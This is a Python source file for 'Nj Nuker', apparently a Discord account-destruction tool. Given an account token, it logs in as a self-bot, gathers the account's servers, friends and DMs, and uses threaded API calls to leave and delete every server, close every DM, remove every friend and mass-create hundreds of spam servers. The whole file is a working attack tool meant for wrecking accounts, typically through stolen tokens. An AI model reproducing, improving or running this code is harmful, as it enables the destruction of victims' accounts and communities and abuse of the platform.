import os
import sys
import time
import discord
import requests
import threading
import webbrowser
from colorama import Fore
from colored import fg, attr
from discord.ext import commands


class data():
    prefix = ">"
    github = "github.com/kasra-kh"
    discord = "https://discord.gg/hub2UTZc6s"

b = Fore.LIGHTRED_EX

r = Fore.RESET

g = fg('#7000FF')

ra = Fore.RED

clear = lambda: os.system('cls')

os.system(f'title Nj Menu | awaiting Token')


client = commands.Bot(command_prefix=f"{data.prefix}", self_bot = True)

def progressbar(it, prefix="", size=60, file=sys.stdout):
    count = len(it)
    def show(j):
        x = int(size*j/count)
        file.write("%s[%s%s] %i/%i\r" % (prefix, "+"*x, "."*(size-x), j, count))
        file.flush()        
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
    file.write("\n")
    file.flush()

def pedaret(token):
    data = {}

    @client.event
    async def on_ready():
        try:
            os.system(f'title Nj | Authenticated: {client.user.name}#{client.user.discriminator}')
        except Exception as e:
            pass
    
        data['guildsID'] = [guild.id for guild in client.guilds]
        data['friendsID'] = [freind.id for freind in client.user.friends]
        data['channelsID'] = [channel.id for channel in client.private_channels]
       
        await client.close()
    try:
        client.run(token, bot=False)
    except Exception as error:
        print(f"[{g}~{r}] {g}Incorrect Token{r}", error)
        return None
    return data

def menu():
    print(f'''{b}
                        ███╗   ██╗     ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
                        ████╗  ██║     ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
                        ██╔██╗ ██║     ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
                        ██║╚██╗██║██   ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                        ██║ ╚████║╚█████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
                        ╚═╝  ╚═══╝ ╚════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                                       Dev Github : {data.github}
                                       Discord : {data.discord}
                                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{r}                                                            
''')

def lobby():
    print(f'''{ra}

                        ███╗   ██╗     ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
                        ████╗  ██║     ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
                        ██╔██╗ ██║     ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
                        ██║╚██╗██║██   ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                        ██║ ╚████║╚█████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
                        ╚═╝  ╚═══╝ ╚════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                        ╔═══════════════════════╗   ╔═══════════════════════╗
                        ║{r}1 {g}:{r}Nuke Token          {g}║   ║{r}5 {g}:{r}Delete Friends      {g}║
                        ║{r}2 {g}:{r}Leave Servers       {g}║   ║{r}6 {g}:{r}Create Servers      {g}║
                        ║{r}3 {g}:{r}Close Dms           {g}║   ║{r}7 {g}:{r}cls [clears console]{g}║ 
                        ║{r}4 {g}:{r}Delete Servers      {g}║   ║{r}8 {g}:{r}github              {g}║
                        ╚═══════════════════════╝   ╚═══════════════════════╝{r}  
''')

menu()

time.sleep(3)

for i in progressbar(range(15), "Loading.... ", 40):
    time.sleep(0.1)

lobby()

def leaveG(guild_id, token,):
   
      try:
         re = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Left {r}>> [ {g}{guild_id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Leave {r}>> [ {g}{guild_id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return

def createG(name, token, i,):
   
      try:
         payload = {'name': f'{name}', 'region': 'europe', 'icon': None, 'channels': None}
         re = requests.post('https://discord.com/api/v6/guilds', headers={"Authorization": token}, json=payload)
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Created {r}>> [ {g}{name} {r}] {g}Servers{r}")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Create{r}>> [ {g}{name} {i}{r} ]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         return

def deleteG(guild,token,):
   
      try:
         re = requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Deleted {r}>> [ {g}{guild} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Delete {r}>> [ {g}{guild} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass

def closeD(id, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/channels/{id}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Closed {r}>> [ {g}{id} {r}] DMS")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Close {r}>> [ {g}{id} {r}] DMS")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass

def deleteF(friend, token):
   
      try:
         re = requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{friend}", headers={"Authorization": token})
         if re.status_code == 200 or re.status_code == 201 or re.status_code == 204:
            print(f"{r}[{g}STATUS{r}] {g}Removed {r}>> [ {g}{id} {r}]")
         elif re.status_code == 429:
            print(f"{r}[{g}STATUS{r}] {g}Failed Remove{r}>> [ {g}{id} {r}]")
            time.sleep(re.json()['retry_after'])
      except Exception as e:
         pass




def start():
   while True:
      answer = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Choise"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
      if answer == '1':
         clear()
         menu()
         token = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Token"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         acc = pedaret(token)
         num = 300
         name = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Server Name"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         for guild in acc['guildsID']:
            threading.Thread(target=leaveG, args=(guild, token,)).start()
         for guild in acc['guildsID']:
            threading.Thread(target=deleteG, args=(guild, token,)).start()
         for i in range(int(num)):
            threading.Thread(target=createG, args=(name, token, i,)).start()
         for id in acc['channelsID']:
            threading.Thread(target=closeD, args=(id, token,)).start()
         for friend in acc['friendsID']:
            threading.Thread(target=deleteF, args=(friend, token,)).start()
      elif answer == '2':
         clear()
         menu()
         token = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Token"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         acc = pedaret(token)
         for guild in acc['guildsID']:
            threading.Thread(target=leaveG, args=(guild, token,)).start()
      elif answer == '3':
         clear()
         menu()
         token = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Token"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         acc = pedaret(token)
         for id in acc['channelsID']:
            threading.Thread(target=closeD, args=(id, token,)).start()
      elif answer == '4':
         clear()
         menu()
         token = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Token"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         acc = pedaret(token)
         for guild in acc['guildsID']:
            threading.Thread(target=deleteG, args=(guild, token,)).start()
      elif answer == '5':
         clear()
         menu()
         token = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Token"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         acc = pedaret(token)
         for friend in acc['friendsID']:
            threading.Thread(target=deleteF, args=(friend, token,)).start()
      elif answer == '6':
         clear()
         menu()
         token = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Token"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         num = 200
         name = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Nj Nuker"+Fore.BLUE+"~"+Fore.WHITE+"@Server Name"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ").lower()
         clear()
         menu()
         acc = pedaret(token)
         for i in range(int(num)):
            threading.Thread(target=createG, args=(name, token, i,)).start()
      elif answer == 'cls':
         clear()
         lobby()
      elif answer == '8':
         webbrowser.open(f'{data.github}')
         clear()
         lobby()
         

if __name__ == '__main__':
   start()